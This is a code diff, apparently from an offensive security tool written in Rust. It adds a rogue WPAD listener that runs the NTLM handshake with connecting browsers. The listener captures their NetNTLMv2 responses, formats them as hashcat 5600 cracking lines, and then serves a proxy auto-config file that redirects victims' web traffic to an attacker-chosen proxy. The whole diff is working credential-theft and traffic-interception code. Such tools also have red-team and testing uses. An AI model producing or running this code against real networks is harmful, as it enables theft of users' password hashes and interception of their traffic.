@@ -320,6 +320,155 @@ async fn handle_http_connection(mut conn: TcpStream, sink: HashSink) -> Result<(
     }
 }
 
+/// WPAD listener: drives the NTLMSSP handshake, captures credentials, then
+/// serves a PAC file so the browser redirects to a controlled proxy.
+pub struct WpadListener {
+    listener: TcpListener,
+    sink: HashSink,
+    proxy_host: String,
+    proxy_port: u16,
+}
+
+impl WpadListener {
+    /// Bind to `addr` and return a `WpadListener`. `proxy_host` / `proxy_port`
+    /// are embedded in the PAC body returned to the client after auth.
+    pub async fn bind<F, Fut>(
+        addr: &str,
+        proxy_host: impl Into<String>,
+        proxy_port: u16,
+        sink: F,
+    ) -> Result<Self>
+    where
+        F: Fn(String) -> Fut + Send + Sync + 'static,
+        Fut: Future<Output = ()> + Send + 'static,
+    {
+        let listener = TcpListener::bind(addr).await.map_err(|e| Error::Credcap {
+            reason: format!("bind {addr}: {e}"),
+        })?;
+        let sink: HashSink = Arc::new(move |s| Box::pin(sink(s)));
+        Ok(Self {
+            listener,
+            sink,
+            proxy_host: proxy_host.into(),
+            proxy_port,
+        })
+    }
+
+    /// Return the local address the listener is bound to.
+    #[must_use]
+    pub fn local_addr(&self) -> SocketAddr {
+        self.listener
+            .local_addr()
+            .expect("WpadListener was bound but has no local address")
+    }
+
+    /// Accept connections until `cancel` is triggered.
+    pub async fn run(self, cancel: CancellationToken) -> Result<()> {
+        loop {
+            tokio::select! {
+                () = cancel.cancelled() => return Ok(()),
+                r = self.listener.accept() => {
+                    match r {
+                        Ok((conn, _addr)) => {
+                            let sink = self.sink.clone();
+                            let proxy = format!("{}:{}", self.proxy_host, self.proxy_port);
+                            tokio::spawn(async move {
+                                drop(handle_wpad_connection(conn, sink, proxy).await);
+                            });
+                        }
+                        Err(e) => {
+                            tracing::debug!(error = %e, "wpad accept error, continuing");
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+async fn handle_wpad_connection(mut conn: TcpStream, sink: HashSink, proxy: String) -> Result<()> {
+    let mut buf = vec![0u8; 8192];
+    let mut server_challenge: Option<[u8; 8]> = None;
+    loop {
+        let n = match conn.read(&mut buf).await {
+            Ok(0) | Err(_) => return Ok(()),
+            Ok(n) => n,
+        };
+        let req = String::from_utf8_lossy(buf.get(..n).unwrap_or_default()).to_string();
+        let auth_b64 = req.lines().find_map(|l| {
+            // Case-insensitive match on the header name, then take the value
+            // from the *original* line (not the lowercased copy) so the base64
+            // payload is not corrupted by lowercasing.
+            let lower = l.to_ascii_lowercase();
+            if lower.starts_with("authorization: ntlm ") {
+                Some(l["authorization: ntlm ".len()..].trim().to_string())
+            } else {
+                None
+            }
+        });
+
+        match auth_b64 {
+            None => {
+                drop(conn
+                    .write_all(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n")
+                    .await);
+            }
+            Some(b64) => {
+                let Ok(raw) = base64::engine::general_purpose::STANDARD.decode(&b64) else {
+                    drop(conn.write_all(b"HTTP/1.1 400 Bad Request\r\n\r\n").await);
+                    return Ok(());
+                };
+                if raw.len() < 12 {
+                    return Ok(());
+                }
+                let msg_type = raw
+                    .get(8..12)
+                    .and_then(|s| <[u8; 4]>::try_from(s).ok())
+                    .map_or(0, u32::from_le_bytes);
+                match msg_type {
+                    1 => {
+                        let challenge = next_challenge();
+                        server_challenge = Some(challenge);
+                        let t2 = build_type2(challenge);
+                        let t2_b64 = base64::engine::general_purpose::STANDARD.encode(&t2);
+                        let resp = format!(
+                            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {t2_b64}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n"
+                        );
+                        drop(conn.write_all(resp.as_bytes()).await);
+                    }
+                    3 => {
+                        if let Some(challenge) = server_challenge
+                            && let Ok(t3) = parse_type3(&raw)
+                            && let Some(line) = hashcat_5600_line(&t3, challenge)
+                        {
+                            tracing::info!(
+                                user = %t3.user,
+                                domain = %t3.domain,
+                                "wpad credcap captured"
+                            );
+                            (sink)(line).await;
+                        }
+                        let pac = format!(
+                            "function FindProxyForURL(url, host) {{\n  return \"PROXY {proxy}\";\n}}\n"
+                        );
+                        let body = pac.as_bytes();
+                        let resp_head = format!(
+                            "HTTP/1.1 200 OK\r\nContent-Type: application/x-ns-proxy-autoconfig\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+                            body.len()
+                        );
+                        drop(conn.write_all(resp_head.as_bytes()).await);
+                        drop(conn.write_all(body).await);
+                        return Ok(());
+                    }
+                    _ => {
+                        return Ok(());
+                    }
+                }
+            }
+        }
+    }
+}
+
 fn next_challenge() -> [u8; 8] {
     use std::sync::atomic::{AtomicU64, Ordering};
     // Deterministic-but-non-trivial counter. Server challenge in our
